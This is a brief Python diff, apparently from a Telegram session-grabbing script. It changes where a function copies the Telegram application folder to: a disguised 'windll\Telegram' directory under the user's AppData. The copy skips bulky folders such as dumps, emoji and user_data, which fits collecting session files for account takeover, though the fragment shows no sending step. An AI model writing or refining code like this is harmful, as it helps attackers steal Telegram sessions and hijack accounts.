@@ -21,6 +21,8 @@ directory = r'C:\windll\Telegram'
 
 def Telegram():
     try:
+        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+        directory = rf'{pathtofile}\windll\Telegram'
         shutil.copytree(path1,
                 directory,
                 ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
